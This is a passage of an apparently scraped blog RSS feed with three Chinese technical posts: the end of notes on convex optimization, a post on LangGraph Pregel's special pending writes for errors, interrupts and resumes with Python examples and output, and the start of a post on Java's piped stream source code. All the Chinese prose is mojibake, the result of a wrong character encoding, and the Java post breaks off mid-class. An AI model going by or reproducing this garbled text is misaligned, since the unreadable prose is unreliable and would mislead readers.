\]</div><p></p><p>ç±æ­¤çå°ï¼å½<span class="math inline">\(\alpha_1&gt;0\)</span>ååå°æ¶ï¼<span class="math inline">\(\mathbf{X}\)</span>ååæ¥è¿<span class="math inline">\(\mathbf{X}^*\)</span> ï¼æ³¨æå°æ­¤æ¶ä¹æ<span class="math inline">\(f(\mathbf{X})&lt;f(\mathbf{X}^*)\)</span>ï¼èè¿ä¸<span class="math inline">\(\mathbf{X}^*\)</span> æ¯å±é¨æå°å¼ç¹ç¸çç¾ï¼å æ­¤<span class="math inline">\(\mathbf{X}^*\)</span> å¿æ¯å¨å±æå°å¼ã</p>
<p>â	        (2) åè®¾<span class="math inline">\(\mathbf{X}^*\)</span> ä¸æ¯å¯ä¸å¨å±çæå°å¼ç¹ï¼å¿å­å¨<span class="math inline">\(\mathbf{X}^{'}\in\mathbf{C}\)</span> ä½<span class="math inline">\(\mathbf{X}^{\prime}\neq\mathbf{X}^*\)</span>ï¼ä½¿å¾<span class="math inline">\(f(\mathbf{X}^{\prime})=f(\mathbf{X}^*)\)</span>ãèèä¸­ç¹<span class="math inline">\(\mathbf{X}=\frac{1}{2}(\mathbf{X}^{\prime}+\mathbf{X}^{*})\in{\mathbf{C}}\)</span> ãç±äº <span class="math inline">\(f\)</span>çä¸¥æ ¼çå¸æ§ï¼æ</p>
<p></p><div class="math display">\[f(\mathbf{X})=f(\frac{1}{2}(\mathbf{X^*}+\mathbf{X}^{\prime}))&lt;\frac{1}{2}(f(\mathbf{X}^*)+f(\mathbf{X}^{\prime}))=f(\mathbf{X}^{*}) \tag{18}
\]</div><p></p><p>æ­¤å¼ä¸<span class="math inline">\(\mathbf{X}^{*}\)</span> ä¸ºå¨å±æå°å¼ç¹ç¸çç¾ãè¿å°±è¯æäºå¯ä¸æ§ã</p>
<p>â       ç±ä¸é¢çæ¨å¯¼å¯ç¥ï¼å¸è§åæå¦ä¸ä¼ç§çéè¦æ§è´¨ï¼</p>
<ol>
<li>
<p><strong>å±é¨æä¼å³å¨å±æä¼</strong>ï¼å¸è§åçä»»ä¸å±é¨æå°å¼ç¹é½æ¯å¨å±æå°å¼ç¹ï¼</p>
</li>
<li>
<p><strong>æä¼è§£éä¸ºå¸é</strong>ï¼è¥å­å¨æä¼è§£ï¼åæææä¼è§£ææä¸ä¸ªå¸éï¼</p>
</li>
<li>
<p><strong>å¯å¾®æåµä¸çæä¼æ§æ¡ä»¶</strong>ï¼è¥<span class="math inline">\(f\)</span>å¯å¾®ï¼å<span class="math inline">\(\mathbf{x}^*\)</span>ä¸ºå¨å±æä¼è§£çæåµä¸ï¼çåè¦æ¡ä»¶ï¼</p>
<p></p><div class="math display">\[\nabla f(\mathbf{x}^*)^T(\mathbf{y}-\mathbf{x}^*)\geq{0} \hspace{2em}\forall{y}\in{X}
\]</div><p></p></li>
<li>
<p><strong>å¯¹å¶çè®º</strong>ï¼å¸è§åçå¯¹å¶é®é¢ä¹æ¯å¸çï¼ä¸å¼ºå¯¹å¶æ§éå¸¸æç«ï¼å¨æäºçº¦æåæ§ä¸ï¼å¦Slateræ¡ä»¶ï¼ï¼å³åé®é¢ä¸å¯¹å¶é®é¢çæä¼å¼ç¸ç­ã</p>
</li>
</ol>
<p>å¶å¸¸è§çä¼åé®é¢çä¾å­ï¼</p>
<ul>
<li><strong>çº¿æ§è§å</strong>ï¼ç®æ å½æ°åçº¦æåä¸ºçº¿æ§ï¼æ¾ç¶æ»¡è¶³å¸æ§ã</li>
<li><strong>äºæ¬¡è§å</strong>ï¼ç®æ å½æ°ä¸ºäºæ¬¡å <span class="math inline">\(\frac{1}{2}x^TQx+c^Tx\)</span>ï¼è¥ <span class="math inline">\(Q\)</span> åæ­£å®ï¼åä¸ºå¸äºæ¬¡è§åã</li>
<li><strong>æå°äºä¹ï¼</strong><span class="math inline">\(min||\mathbf{A}x-b||_2^2\)</span> æ¯å¸çï¼</li>
<li><strong>é¥è§å</strong>ï¼å¦äºé¶é¥è§åãåå®è§åï¼é½æ¯å¸è§åçéè¦æ¨å¹¿ã</li>
</ul>


</div>
<div class="clear"></div>

            </div>
            <div class="postDesc">posted @ 
<span id="post-date" data-last-update-days="0.004166666666666667" data-date-updated="2026-02-20 14:36">2026-02-20 14:30</span>&nbsp;
<a href="https://www.cnblogs.com/GeophysicsWorker">GeoFXR</a>&nbsp;
éè¯»(<span id="post_view_count">0</span>)&nbsp;
è¯è®º(<span id="post_comment_count">0</span>)&nbsp;
&nbsp;
<a href="javascript:void(0)" onclick="AddToWz(19626486);return false;">æ¶è</a>&nbsp;
<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '19626486', targetLink: 'https://www.cnblogs.com/GeophysicsWorker/p/19626486', title: 'å¸ä¼åæ°å­¦åºç¡ç¬è®°ï¼å­ï¼ï¼å¸éãå¸å½æ°ä¸å¸è§å' })">ä¸¾æ¥</a>
</div>
         ]]>
    </description>
    </item>
<item>
    <title><![CDATA[ [æè§£LangChainæ§è¡å¼æ]éå¸¸è§Pending Writeçæä¹å ]]></title>
    <link>https://www.cnblogs.com/jaydenai/p/19625923/non-regular-pending-writes</link>
    <guid>fc98387085725e992681708a6e1dd471</guid>
    <description>
    <![CDATA[ 
            <h1 class="postTitle">
                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/jaydenai/p/19625923/non-regular-pending-writes" title="åå¸äº 2026-02-20 09:11">
    <span role="heading" aria-level="2">[æè§£LangChainæ§è¡å¼æ]éå¸¸è§Pending Writeçæä¹å</span>
    

</a>

            </h1>
            <div class="clear"></div>
            <div class="postBody">
                    <div id="cnblogs_post_description" style="display: none">
        
        PendingWriteä¸åç»çç¬¬äºé¨åè¡¨ç¤ºåå¥çChannelï¼ä½æ¯å¯¹äºä¸äºç¹æ®çåºæ¯ï¼æ¯å¦åºéãæ åå¥ãä¸­æ­åæ¢å¤ï¼å®ä»¬çå¼ä¸åæ¯ä¸ä¸ªæ®éçChannelåç§°
    </div>
<div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
<p>PendingWriteä¸åç»çç¬¬äºé¨åè¡¨ç¤ºåå¥çChannelï¼ä½æ¯å¯¹äºä¸äºç¹æ®çåºæ¯ï¼æ¯å¦åºéãæ åå¥ãä¸­æ­åæ¢å¤ï¼å®ä»¬çå¼ä¸åæ¯ä¸ä¸ªæ®éçChannelåç§°ï¼èæ¯ä½¿ç¨å¦ä¸çå¼ï¼</p>
<ul>
<li><code>__error__</code>ï¼æ§è¡Nodeå¯¹åºçä»»å¡åºç°å¼å¸¸ï¼</li>
<li><code>__no_writes__</code>ï¼Nodeä»»å¡æåæ§è¡ï¼ä½æ¯æ²¡ææ§è¡éå¯¹Channelçè¾åºï¼</li>
<li><code>__interrupt__</code>ï¼ä»»å¡ä¸­æ­ï¼</li>
<li><code>__resume__</code>ï¼è¡¨ç¤ºæ¢å¤æ§è¡æä¾çæ°æ®ï¼</li>
</ul>
<p>æ¥ä¸æ¥æä»¬ä¸¤ä¸ªä¾å­æ¥äº§çä¸è¿°è¿å ç§ç¹æ®çPending Writeãæä»¬åæ¥æ¨¡æåºéçåºæ¯ï¼å¦ä¸é¢çä»£ç çæ®µæç¤ºï¼æä»¬æ§è¡çPregelå¯¹è±¡å·æä¸ä¸ªå¯ä¸çNodeï¼å®çå¤çå½æ°ç´æ¥æåºä¸ä¸ªå¼å¸¸ã</p>
<pre><code class="language-python">from langgraph.pregel import Pregel, NodeBuilder
from langgraph.channels import LastValue
from langgraph.checkpoint.memory import InMemorySaver
from typing import Any

def handle(args: dict[str, Any])-&gt;None:
    raise Exception("manllually raised exception")

node = NodeBuilder().subscribe_to("start").do(handle)
app = Pregel(
    nodes={"body": node},
    channels={"start": LastValue(str)},
    checkpointer=InMemorySaver(),
    input_channels=["start"],
    output_channels=[],
)
config = {"configurable": {"thread_id": "123"}}
try:
    result = app.invoke({"start": "begin"}, config=config)
except Exception as ex:
    print(f"Caught exception:{ex}" )

(_, _, _, _, pending_writes) = app.checkpointer.get_tuple(config)
print(pending_writes)
</code></pre>
<p>æä»¬å¨try/exceptåä¸­å®æéå¯¹Pregelçè°ç¨ï¼å¹¶ææåè¾åºå¾å°çå¼å¸¸ä¿¡æ¯ãæ¥ä¸æ¥æä»¬è°ç¨Checkpointerï¼ä¸ä¸ªInMemorySaverå¯¹è±¡ï¼ç<code>get_tuple</code>æ¹æ³å¾å°å¯¹åºç<code>CheckpointTuple</code>åç»ï¼ç¶åå°<code>pending_writes</code>é¨åè¾åºåºæ¥ãä»å¦ä¸æç¤ºçè¾åºç»æå¯ä»¥çåºï¼è¿ä¸ªPending Writeä¸åç»çChannelåç§°è¢«è®¾ç½®ä¸º <code>__error__</code> ï¼æ´ä¸ªExceptionå¯¹è±¡æä¸ºäºåå¥çåå®¹ã</p>
<pre><code>Caught exception:manllually raised exception
[('f9ff1e88-4d82-f417-ad11-8fd870bfe647', '__error__', "Exception('manllually raised exception')")]
</code></pre>
<p>ç±äºå¹¶ä¸æ¯ææçNodeé½æåChannelåå¥æ§è¡ç»æçéæ±ï¼æä»¥åªè¦å¤çå½æ°æåæ§è¡ï¼å³ä½¿æ²¡æChannelè¾åºçè¡ä¸ºï¼è¯¥ä»»å¡çç¶æä¹ä¼è¢«è§ä¸º<code>æå</code>ï¼Checkpointeråªæ¯éç¨ä¸åçå½¢å¼æ¥è®°å½è¿ç§ä¸éè¦åå¥çPending Writeãå¦ä¸çè¿ä¸ªç¨åºä¸ä»ä»æ¼ç¤ºäºè¿ç§<code>æ è¾åºåå¥</code>çåºæ¯ï¼è¿åæ¶æ¨¡æäºä¸­æ­åæ¢å¤ã</p>
<pre><code class="language-python">from langgraph.pregel import Pregel, NodeBuilder
from langgraph.channels import LastValue
from langgraph.checkpoint.memory import InMemorySaver
from typing import Any
from langgraph.types import Command, interrupt

def foo(args: dict[str, Any]) -&gt; list[str]:
    resume1 = interrupt("1st interrupt")
    assert resume1 == "1st resume"

    resume2 = interrupt("2nd interrupt")
    assert resume2 == "2nd resume"

    resume3 = interrupt("3rd interrupt")
    assert resume3 == "3rd resume"

    return [resume1, resume2, resume3]

def bar(args: dict[str, Any]) -&gt; None:
    pass

app = Pregel(
    nodes={
        "foo": NodeBuilder().subscribe_only("start").do(foo).write_to("output"),
        "bar": NodeBuilder().subscribe_only("start").do(bar),
    },
    channels={
        "start": LastValue(str),
        "output": LastValue(list[str]),
    },
    input_channels=["start"],
    output_channels=["output"],
    checkpointer=InMemorySaver(),
)

config = {"configurable": {"thread_id": "123"}}
result = app.invoke(input={"start": "begin"}, config=config, stream_mode="tasks")
(_, _, _, _, pending_writes) = app.checkpointer.get_tuple(config)
print(f"After invoke:\n{pending_writes}")

app.invoke(input=Command(resume="1st resume"), config=config)
(_, _, _, _, pending_writes) = app.checkpointer.get_tuple(config)
print(f"\nAfter resume 1:\n{pending_writes}")

app.invoke(input=Command(resume="2nd resume"), config=config)
(_, _, _, _, pending_writes) = app.checkpointer.get_tuple(config)
print(f"\nAfter resume 2:\n{pending_writes}")

result = app.invoke(input=Command(resume="3rd resume"), config=config)
assert result == {"output": ["1st resume", "2nd resume", "3rd resume"]}
(_, _, _, _, pending_writes) = app.checkpointer.get_tuple(config)
print(f"\nAfter resume 3:\n{pending_writes}")
</code></pre>
<p>å¦ä¸é¢çä»£ç çæ®µæç¤ºï¼æä»¬ä¸ºPregelæä¾äºä¸¤ä¸ªå¹¶è¡æ§è¡çèç¹fooåbarï¼å¶ä¸­barå¯¹åºçå½æ°å¹¶æªæ§è¡ä»»ä½æææä½ï¼ä¹æ²¡æä»»ä½çè¾åºãæä»¬ä¸ºèç¹fooå¯¹åºçå¤çå½æ°å¶é äºä¸æ¬¡äººä¸ºä¸­æ­ï¼æä»¥éè¦è³å°åæ¬¡è°ç¨æè½ç»æã</p>
<p>æä»¬å¨åå»ºçRunnableConfigå¯¹è±¡ä¸­æä¾äºç»ä¸çThread IDï¼å¹¶å°å®ä½ä¸ºåç»­æ¹æ³è°ç¨çåæ°ãéå¯¹Pregelçä¸æ¬¡è°ç¨ï¼ç¬¬ä¸æ¬¡æ¯ä¸ºå¸¸è§è°ç¨ï¼åé¢ä¸¤æ¬¡åå«æ¯éå¯¹ä¸¤æ¬¡ä¸­æ­çæ¢å¤è°ç¨ãæä»¬å¨æ¯æ¬¡è°ç¨åï¼å¾å°å¹¶è¾åºCheckpointerè®°å½ä¸æ¥çPending Writeã</p>
<p>ä»å¦ä¸çè¾åºç»æå¯ä»¥çåºï¼ç¬¬ä¸æ¬¡å¸¸è§è°ç¨åï¼ èç¹fooåå¨ç¬¬ä¸ä¸ªä¸­æ­å¤ï¼èç¹baræåæ§è¡ä½æ²¡æè¾åºï¼æä»¥Checkpointerå°å®ä»¬ä½ä¸ºPending Writeè®°å½ä¸æ¥ï¼Channelåç§°åå«æ¯<code>__interrupt__</code>å<code>__no_writes__</code>ï¼åèçåå¥åå®¹æ¯ä¸ä¸ª<code>Interrupt</code>å¯¹è±¡ï¼å®å·ææä»¬æå®çå¼â1st interruptâãæä»¬ä¹çå°äºInterruptå¯¹è±¡å·æä¸ä¸ªå¯ä¸æ è¯ï¼å¨æ¢å¤è°ç¨æ¶æä»¬å¯ä»¥å©ç¨æ­¤æ è¯ä¸ºå¶æå®éå¯¹æ§çæ¢å¤æ°æ®ï¼Command(resume={"id":"resume value")ï¼ã</p>
<pre><code>After invoke:
[('8d407c25-02f6-9101-d1b8-5a99c247edde', '__interrupt__', [Interrupt(value='1st interrupt', id='5603cdf275d8b8ba0633d272fa176fd3')]), ('22507855-e257-1b5b-eb1a-3c3fb0a071e9', '__no_writes__', None)]

After resume 1:
[('8d407c25-02f6-9101-d1b8-5a99c247edde', '__interrupt__', [Interrupt(value='2nd interrupt', id='5603cdf275d8b8ba0633d272fa176fd3')]), ('22507855-e257-1b5b-eb1a-3c3fb0a071e9', '__no_writes__', None), ('00000000-0000-0000-0000-000000000000', '__resume__', '1st resume'), ('8d407c25-02f6-9101-d1b8-5a99c247edde', '__resume__', ['1st resume'])]

After resume 2:
[('8d407c25-02f6-9101-d1b8-5a99c247edde', '__interrupt__', [Interrupt(value='3rd interrupt', id='5603cdf275d8b8ba0633d272fa176fd3')]), ('22507855-e257-1b5b-eb1a-3c3fb0a071e9', '__no_writes__', None), ('00000000-0000-0000-0000-000000000000', '__resume__', '2nd resume'), ('8d407c25-02f6-9101-d1b8-5a99c247edde', '__resume__', ['1st resume', '2nd resume'])]

After resume 3:
[]
</code></pre>
<p>éå¯¹ç¬¬ä¸ä¸ªä¸­æ­çæ¢å¤è°ç¨åï¼èç¹fooåå¨ç¬¬äºä¸ªä¸­æ­å¤ï¼æ­¤æ¶Checkpointerä¼åå»ºä¸¤ä¸ªæ°çPending Writeæä¹åæä»¬æä¾çResume Valueï¼â1st resumeâï¼ï¼å®çChannelåç§°å°±æ¯<code>__resume__</code>ï¼ä½ä¸ºä»ä¹æ¯ä¸¤ä¸ªå¢ï¼</p>
<p>è¿å®éä¸åæ äº Pregel å¤ç<code>å¤é¨æä»¤æ³¨å¥</code>ä¸<code>Nodeåé¨æ¶è´¹</code>çåæ­¥æºå¶ãç¬¬ä¸ä¸ªè¢«ç§°ä¸ºå¨å±Resume Valueï¼Global Resume Valueï¼, å®ä»£è¡¨ä»å¤é¨ï¼éè¿Command(resume=...)ï¼æ³¨å¥å°å¾ä¸­çåå§æä»¤ãç±äºå®ä¸æ¯ç±å¾åNodeäº§ççï¼å æ­¤ Task ID ä¸ºç©ºï¼å®æ¯å¤éæ´ä¸ªæåç¶æçâæ»å¼å³âãç¬¬äºä¸ªèç¹fooå¯¹å¨å±Resume Valueçæ¶è´¹è®°å½ï¼æä»¥å·æä¸ä¸ªæç¡®çTaks IDãå½èç¹fooè¢«å¤éå¹¶æ§è¡å°interruptè¡æ¶ï¼å®ä¼ä»å¨å±Resume Valueè¯»åæ°æ®ãä¸ºäºä¿è¯å¹ç­æ§åå¯åæº¯æ§ï¼ç³»ç»ä¼å°<code>æ¿èµ°äºåªä¸ªResume Value</code>è®°å½å¨å®çä»»å¡è·¯å¾ä¸ã</p>
<p>éå¯¹Resumeçåä½è®¾ç½®æ¯ä¸ºäºè§£å³<code>éå¥ä¸åæº¯</code>é®é¢ãå¨å±è®°å½è¯æäº<code>ç¨æ·ç¡®å®æä¾äºè¿ä¸ªå¼</code>ãNodeè®°å½è¯æäº<code>è¿ä¸ªå¼ç¡®å®è¢«è¿ä¸ªç¹å®çinterruptå½æ°è°ç¨æ¶è´¹äº</code>ãä¸ä¸ªNodeåé¨å¯ä»¥è¿ç»­è°ç¨å¤æ¬¡interruptå½æ°ï¼ç³»ç»éè¦æé¡ºåºè®°å½è¯¥Nodeæ¶è´¹è¿çææResume Valueï¼ä»¥ä¾¿å¨âæ¶é´æè¡âæéè¯æ¶è½å¤ç²¾ç¡®å¯¹é½ã</p>
<p>å½æä»¬è°ç¨interruptå½æ°å®æ½äººä¸ºä¸­æ­æ¶ï¼åºå±å®éä¸ä¼æåºä¸ä¸ª<code>GraphInterrupt</code>å¼å¸¸ï¼Pregeléè¿æè·è¿ä¸ªå¼å¸¸è¿èçæéå¯¹æ§çPendingWriteï¼æä»¥éå¯¹åä¸ä¸ªä»»å¡æå¯è½æä¸ä¸ªå¯ä¸çä¸­æ­ç±»åçPendingWriteãç±äºæ¢å¤æ§è¡æ»æ¯ä¼<code>ä»å¤´æ§è¡Nodeå½æ°</code>ï¼æä»¥åºäºä¸­æ­çPendingWriteå¹¶ä¸ä¼æ¢å¤æ§è¡é æä»»ä½å½±åãæä»¥å½æä»¬å®æç¬¬äºæ¬¡æ¢å¤è°ç¨åï¼æä¹åçä¸­æ­PendingWriteåæ çæ¯éå¯¹ç¬¬äºæ¬¡interruptå½æ°çè°ç¨ï¼å¯¹åºInterruptå¯¹è±¡çå¼ä¸º<code>2nd interrupt</code>ã</p>
<p>Resume Valueå¿é¡»æç§é¡ºåºæä¾ï¼å ä¸ºæ¯éå°ä¸ä¸ªinterrptå½æ°çè°ç¨ï¼é½ä¼å©ç¨åé¢ä»ç»è¿çè®¡ç®å¨æä¾çç´¢å¼ï¼ä»Resume Valueåè¡¨ä¸­è¯»åResume Valueä½ä¸ºè¯¥è°ç¨çè¿åå¼ï¼æä»¥æä¹åçç¬¬äºä¸ªåºäºæ¢å¤çPendingWriteå¯¹åºçå¼åæäºåå«ä¸¤ä¸ªResume Valueçåè¡¨ï¼['1st resume', '2nd resume']ï¼ã</p>
<p>å¨éå¯¹ç¬¬ä¸ä¸ªä¸­æ­çæ¢å¤æ§è¡ç»æåï¼fooNodeå®æäºå®çæ§è¡ä»»å¡ï¼èbarå¯¹åºçä»»å¡æ¬èº«å°±æ¯æåç¶æï¼æä»¥æ´ä¸ªSuperstepé¡ºå©ç»æï¼èªç¶ä¹å°±ä¸å­å¨Pending Writeäºã</p>


</div>
<div class="clear"></div>

            </div>
            <div class="postDesc">posted @ 
<span id="post-date" data-last-update-days="0" data-date-updated="2026-02-20 09:12">2026-02-20 09:11</span>&nbsp;
<a href="https://www.cnblogs.com/jaydenai">JaydenAI</a>&nbsp;
éè¯»(<span id="post_view_count">43</span>)&nbsp;
è¯è®º(<span id="post_comment_count">0</span>)&nbsp;
&nbsp;
<a href="javascript:void(0)" onclick="AddToWz(19625923);return false;">æ¶è</a>&nbsp;
<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '19625923', targetLink: 'https://www.cnblogs.com/jaydenai/p/19625923/non-regular-pending-writes', title: '[æè§£LangChainæ§è¡å¼æ]éå¸¸è§Pending Writeçæä¹å' })">ä¸¾æ¥</a>
</div>
         ]]>
    </description>
    </item>
<item>
    <title><![CDATA[ 9ãPipedInputStreamåPipedOutputStreamçæºç åæåä½¿ç¨æ¹æ³è¯¦ç»åæ ]]></title>
    <link>https://www.cnblogs.com/Carey-ccl/p/19625392</link>
    <guid>363a1c6157b9a2786d34ff60a8043376</guid>
    <description>
    <![CDATA[ 
            <h1 class="postTitle">
                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/Carey-ccl/p/19625392" title="åå¸äº 2026-02-19 22:07">
    <span role="heading" aria-level="2">9ãPipedInputStreamåPipedOutputStreamçæºç åæåä½¿ç¨æ¹æ³è¯¦ç»åæ</span>
    

</a>

            </h1>
            <div class="clear"></div>
            <div class="postBody">
                <div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
<p>ââå¨å¤çº¿ç¨ç¼ç¨ä¸­ï¼çº¿ç¨é´çæ°æ®äº¤æ¢æ¯ä¸ä¸ªå¸¸è§éæ±ãJava IOåä¸­çPipedInputStreamåPipedOutputStreamæä¾äºä¸ç§é«æççº¿ç¨é´éä¿¡æºå¶ï¼åè®¸ä¸æ¹ï¼å¤ä¸ªï¼çº¿ç¨åPipedOutputStreamåå¥æ°æ®ï¼å¦ä¸æ¹ï¼å¤ä¸ªï¼çº¿ç¨ä»PipedInputStreamè¯»åæ°æ®ã<br>
ââä½æ¯ï¼åä¸æ¹ï¼å¤ä¸ªï¼çº¿ç¨ç¸äºä¹é´ä¼å­å¨ç«äºï¼æ¯å¦ï¼åä¸æ¹åPipedOutputStreamåå¥æ°æ®ççº¿ç¨ä¼å­å¨ç«äºï¼åä¸æ¹ä»PipedInputStreamè¯»åæ°æ®ççº¿ç¨ä¹ä¼å­å¨ç«äºãå æ­¤PipedInputStreamåPipedOutputStreamä¸­ççº¿ç¨å®å¨éè¦éè¿synchronizedå³é®å­åwait()/notifyAll()æºå¶å®ç°ãä¸å»ºè®®å¨ä¸ä¸ªçº¿ç¨ä¸­åæ¶ä½¿ç¨PipedInputStreamåPipedOutputStreamï¼å ä¸ºè¿æ ·å¯è½ä¼å¯¼è´è¿ä¸ªçº¿ç¨é·å¥æ­»éç¶æã<br>
ââPipedInputStreamåPipedOutputStreamä¹é´çéä¿¡æ¬è´¨ä¸æ¯ä¸ä¸ªçäº§è-æ¶è´¹èæ¨¡åï¼å¶ä¸­PipedOutputStreamä½ä¸ºçäº§èï¼PipedInputStreamä½ä¸ºæ¶è´¹èãä¸¤èéè¿ä¸ä¸ªå¾ªç¯ç¼å²åºï¼byte[]æ°ç»ï¼è¿è¡æ°æ®äº¤æ¢ï¼PipedOutputStreamå°æ°æ®ç¼å­å¨PipedInputStreamçæ°ç»å½ä¸­ï¼ç­å¾PipedInputStreamçè¯»åã<br>
ââPipedInputStreamåPipedOutputStreamçUMLå³ç³»å¾ï¼å¦ä¸æç¤ºï¼<br>
<img alt="clipboard" loading="lazy" data-src="https://img2024.cnblogs.com/blog/2485827/202602/2485827-20260219215754596-156220550.png" class="lazyload"></p>
<h4 id="ä¸pipedoutputstreamçäº§èæºç åpipedinputstreamæ¶è´¹èä¸­çç¼å²åºbyteæ°ç»åå¥å­èæ°æ®çè¾åºstreamçäº§è">ä¸ãPipedOutputStreamï¼çäº§èï¼æºç ââåPipedInputStreamï¼æ¶è´¹èï¼ä¸­çç¼å²åºï¼byte[]æ°ç»ï¼åå¥å­èæ°æ®çè¾åºStreamï¼çäº§èï¼</h4>
<pre><code>package java.io;

import java.io.*;

public
class PipedOutputStream extends OutputStream {
    //ä¸è¿ä¸ªPipedOutputStreamï¼çäº§èï¼ç¸å³èç PipedInputStream ï¼æ¶è´¹èï¼
    private PipedInputStream sink;
    
    //æé å½æ°
    public PipedOutputStream(PipedInputStream snk)  throws IOException {
        connect(snk);//è°ç¨connect()å½æ°ï¼æ¥æ¹åPipedInputStream ï¼æ¶è´¹èï¼ä¸­ä¸äºåéçå¼
    }
    
    //æé å½æ°
    public PipedOutputStream() {
    }
    
    //çº¿ç¨åæ­¥å½æ°ï¼ç¨æ¥æ¹åå°è¦å³èçPipedInputStream ï¼æ¶è´¹èï¼ä¸­ä¸äºåéçå¼
    public synchronized void connect(PipedInputStream snk) throws IOException {
        if (snk == null) {
            throw new NullPointerException();//å¦æå°è¦å³èçPipedInputStream ï¼æ¶è´¹èï¼ä¸ºnullï¼æåºNullPointerException
        } else if (sink != null || snk.connected) {
            //å¦æä¸è¿ä¸ªPipedOutputStreamï¼çäº§èï¼ç¸å³èç PipedInputStream ï¼æ¶è´¹èï¼!=nullæèå°è¦å³èçPipedInputStream ï¼æ¶è´¹èï¼çboolean connectedåéä¸ºtrueï¼åæåºIOException
            throw new IOException("Already connected");
        }
        sink = snk;//å°è¿ä¸ªPipedOutputStreamï¼çäº§èï¼ä¸è¿ä¸ªPipedInputStream ï¼æ¶è´¹èï¼ç¸å³è
        snk.in = -1;//æ¹åPipedInputStream ï¼æ¶è´¹èï¼ä¸­çåéint in=-1
        snk.out = 0;//æ¹åPipedInputStream ï¼æ¶è´¹èï¼ä¸­çåéint out=0
        snk.connected = true;//æ¹åPipedInputStream ï¼æ¶è´¹èï¼ä¸­çåéboolean connected=true
    }
    
    //åä¸è¿ä¸ªPipedOutputStreamï¼çäº§èï¼ç¸å³èç PipedInputStream ï¼æ¶è´¹èï¼çç¼å²åºï¼byte[]æ°ç»ï¼åå¥1ä¸ªå­è
    public void write(int b)  throws IOException {
        if (sink == null) {
             //å¦æä¸è¿ä¸ªPipedOutputStreamï¼çäº§èï¼ç¸å³èç PipedInputStream ï¼æ¶è´¹èï¼== nullï¼æåºIOException
            throw new IOException("Pipe not connected");
        }
        sink.receive(b);//æç»è°ç¨çæ¯è¿ä¸ªç¸å³èç PipedInputStream ï¼æ¶è´¹èï¼çreceive(int b)å½æ°
    }
    
    //åä¸è¿ä¸ªPipedOutputStreamï¼çäº§èï¼ç¸å³èç PipedInputStream ï¼æ¶è´¹èï¼çç¼å²åºï¼byte[]æ°ç»ï¼åå¥byte[]æ°ç»bç[off,off+len)ï¼å·¦é­å³å¼ï¼ä¸åæ¬off+lenï¼ç´¢å¼ä½ç½®çå­è
    public void write(byte b[], int off, int len) throws IOException {
        if (sink == null) {
            //å¦æä¸è¿ä¸ªPipedOutputStreamï¼çäº§èï¼ç¸å³èç PipedInputStream ï¼æ¶è´¹èï¼== nullï¼æåºIOException
            throw new IOException("Pipe not connected");
        } else if (b == null) {
            throw new NullPointerException();//å¦æbyte[]æ°ç»b==nullï¼æåºä¸ä¸ªNullPointerException
        } else if ((off &lt; 0) || (off &gt; b.length) || (len &lt; 0) ||
                   ((off + len) &gt; b.length) || ((off + len) &lt; 0)) {//byte[]æ°ç»bç[off,off+len)ï¼å·¦é­å³å¼ï¼ç´¢å¼ä½ç½®æ¯å¦æè¶ççæ£æ¥
            throw new IndexOutOfBoundsException();//è¶ççè¯ï¼æåºä¸ä¸ªIndexOutOfBoundsException
        } else if (len == 0) {
            return;//å¦ælen==0ï¼ç»ææ¬æ¬¡å½æ°è°ç¨
        }
        sink.receive(b, off, len);//æç»è°ç¨çæ¯è¿ä¸ªç¸å³èç PipedInputStream ï¼æ¶è´¹èï¼çreceive(byte b[], int off, int len)å½æ°
    }
    
    //çº¿ç¨åæ­¥å½æ°ï¼ä½¿ç¨notifyAll()å½æ°å¤éææä¸è¿ä¸ªPipedOutputStreamï¼çäº§èï¼ç¸å³èç PipedInputStream ï¼æ¶è´¹èï¼çº¿ç¨ï¼è¿ä¸ªæ¶è´¹èå¯ä»¥ç»å®1~å¤ä¸ªçº¿ç¨ï¼
    public synchronized void flush() throws IOException {
        if (sink != null) {
            synchronized (sink) {
                sink.notifyAll();
            }
        }
    }
    //å³é­è¿ä¸ªPipedOutputStreamï¼çäº§èï¼ï¼è¿ä¸ªPipedOutputStreamï¼çäº§èï¼ä¸è½ååä¸å®ç¸å³èçPipedInputStreamï¼æ¶è´¹èï¼ä¸­çç¼å²åºï¼byte[]æ°ç»ï¼åå¥å­èæ°æ®
    public void close()  throws IOException {
        if (sink != null) {
            sink.receivedLast();
        }
    }
}
</code></pre>
<h4 id="äºpipedinputstreamæ¶è´¹èæºç ä»èªå·±çç¼å²åºbyteæ°ç»è¯»åå­èæ°æ®çè¾å¥streamæ¶è´¹è">äºãPipedInputStreamï¼æ¶è´¹èï¼æºç ââä»èªå·±çç¼å²åºï¼byte[]æ°ç»ï¼è¯»åå­èæ°æ®çè¾å¥Streamï¼æ¶è´¹èï¼</h4>
<pre><code>package java.io;

public class PipedInputStream extends InputStream {
    //æ è®°ç¬¦ï¼trueè¡¨ç¤ºä¸è¿ä¸ª PipedInputStream ï¼æ¶è´¹èï¼ç¸å³èçPipedOutputStreamï¼çäº§èï¼å·²ç»å³é­ï¼åä¹ï¼åä¹
    boolean closedByWriter = false;
    //æ è®°ç¬¦ï¼trueè¡¨ç¤ºå½åè¿ä¸ª PipedInputStream ï¼æ¶è´¹èï¼å·²ç»å³é­äºï¼åä¹ï¼åä¹
    volatile boolean closedByReader = false;
    //æ è®°ç¬¦ï¼trueè¡¨ç¤ºä¸è¿ä¸ª PipedInputStream ï¼æ¶è´¹èï¼ç¸å³èçPipedOutputStreamï¼çäº§èï¼å·²ç»ææäºè¿ä¸ªPipedInputStream ï¼æ¶è´¹èï¼å¯¹è±¡ï¼æèå«å·²ç»è¿æ¥ä¸äºï¼ï¼åä¹ï¼åä¹
    boolean connected = false;

    Thread readSide;//å½åæ¶è´¹ççº¿ç¨
    Thread writeSide;//å½åçäº§èççº¿ç¨
    
    //é»è®¤çPipedInputStream ï¼æ¶è´¹èï¼çç¼å²åºï¼byte[]æ°ç»ï¼çé¿åº¦
    private static final int DEFAULT_PIPE_SIZE = 1024;

    //PipedInputStream ï¼æ¶è´¹èï¼çç¼å²åºï¼byte[]æ°ç»ï¼
    protected byte buffer[];
    //ç¼å²åºï¼byte[]æ°ç»ï¼çåæé
    protected int in = -1;
    //ç¼å²åºï¼byte[]æ°ç»ï¼çè¯»æé
